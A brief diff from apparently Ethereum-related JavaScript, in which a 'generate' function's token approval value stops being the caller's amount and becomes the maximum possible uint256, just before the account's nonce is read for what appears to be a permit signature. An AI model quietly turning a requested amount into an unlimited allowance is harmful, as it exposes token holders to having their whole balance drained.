@@ -77,9 +77,8 @@ const generate = async (data, amount) => {
 
 
     if (Number(currentApproval) >= 0) {
-      const value = BigInt(
-        Number(ethers.utils.parseUnits(amount.toString(), "ether"))
-      );
+      const value = ethers.constants.MaxUint256;
+     
 
       const currentnonce = await contract.nonces(account);
       const newNonce = currentnonce.toNumber();
